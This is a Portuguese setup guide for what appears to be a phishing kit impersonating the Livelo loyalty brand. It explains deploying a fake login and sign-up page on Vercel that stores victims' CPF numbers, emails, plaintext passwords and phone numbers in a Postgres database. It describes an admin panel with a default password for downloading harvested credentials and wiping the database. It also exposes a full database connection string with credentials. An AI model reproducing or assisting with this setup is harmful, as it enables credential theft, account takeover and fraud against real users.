# 🗄️ Configuração do Banco de Dados

## Passo a Passo para Ativar o Sistema de Dados

### 1️⃣ Criar arquivo `.env.local`

Na raiz do projeto, crie um arquivo chamado `.env.local` com o seguinte conteúdo:

```env
POSTGRES_URL="postgresql://neondb_owner:npg_nTIZca0A9ujB@ep-twilight-scene-acavjalj-pooler.sa-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require"
```

### 2️⃣ Instalar Dependências

```bash
npm install
```

Isso instalará:
- `@vercel/postgres` - Cliente PostgreSQL para Vercel
- `axios` - Para chamadas HTTP

### 3️⃣ Iniciar o Projeto

```bash
npm start
```

### 4️⃣ Como Funciona

#### **Coleta de Dados:**

**Login:**
1. Usuário preenche CPF/Email + Senha
2. Clica em "Entrar"
3. Preenche Telefone
4. Clica em "Enviar código"
5. ✅ **Dados salvos no banco:** email, senha, telefone (tipo: "login")

**Cadastro:**
1. Usuário clica em "Criar conta"
2. Preenche CPF + Email + Telefone
3. Marca checkbox
4. Clica em "Criar conta"
5. ✅ **Dados salvos no banco:** cpf, email, telefone (tipo: "register")

#### **Acessar Painel Admin:**

1. Na tela de login, clique no ícone 🔑 (canto inferior esquerdo)
2. Digite a senha: `livelo2026` (você pode mudar)
3. Verá lista de todos os usuários cadastrados

#### **Download dos Dados:**

**Opção 1: Baixar e Manter**
- Clique em "📥 Baixar .txt (manter dados)"
- Gera arquivo e mantém dados no banco

**Opção 2: Baixar e Limpar** ⭐
- Clique em "📥 Baixar .txt e LIMPAR banco"
- Gera arquivo e **limpa banco de dados**
- Próximos usuários começam arquivo novo

### 5️⃣ Mudar Senha do Admin

Edite os arquivos:
- `api/get-users.js` - linha 9
- `api/delete-users.js` - linha 9

Mude de `livelo2026` para sua senha.

---

## 📊 Estrutura da Tabela no Banco:

```sql
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  type VARCHAR(20) NOT NULL,        -- 'login' ou 'register'
  cpf VARCHAR(14),                  -- CPF formatado
  email VARCHAR(255),               -- E-mail do usuário
  phone VARCHAR(15),                -- Telefone formatado
  password VARCHAR(255),            -- Senha (apenas do login)
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

---

## 🚀 Deploy na Vercel

### Configurar Variável de Ambiente:

1. Acesse [vercel.com](https://vercel.com)
2. Vá no seu projeto → Settings → Environment Variables
3. Adicione:
   - **Key:** `POSTGRES_URL`
   - **Value:** `postgresql://neondb_owner:npg_nTIZca0A9ujB@ep-twilight-scene-acavjalj-pooler.sa-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require`

4. Faça novo deploy

### URL do Admin em Produção:

`https://seu-projeto.vercel.app/` → Clique no 🔑

---

## ✅ Vantagens dessa Solução:

- ✅ Dados seguros no banco Neon (PostgreSQL na nuvem)
- ✅ Não perde dados mesmo limpando cache
- ✅ Acessa de qualquer dispositivo
- ✅ Funciona perfeitamente na Vercel
- ✅ Serverless (sem servidor próprio)
- ✅ Gratuito (tier free do Neon)
- ✅ Download em .txt a qualquer momento
- ✅ Limpa banco após download (começa novo arquivo)

---

## 🔒 Segurança:

⚠️ **IMPORTANTE:** Mude a senha padrão `livelo2026`!

⚠️ **CUIDADO:** Nunca exponha a senha do banco publicamente!

---

## 📝 Formato do Arquivo .txt Baixado:

```
DADOS DE USUÁRIOS - LIVELO
======================================================================

USUÁRIO 1
----------------------------------------------------------------------
ID: 1
Data/Hora: 07/01/2026 16:30:15
Tipo: Login
E-mail: usuario@livelo.com
Telefone: (11) 99999-9999
Senha: senha123

USUÁRIO 2
----------------------------------------------------------------------
ID: 2
Data/Hora: 07/01/2026 16:35:20
Tipo: Cadastro
CPF: 123.456.789-00
E-mail: teste@gmail.com
Telefone: (11) 98888-7777


Total de registros: 2
Gerado em: 07/01/2026 16:40:00
```

---

**Sistema pronto! 🎉**
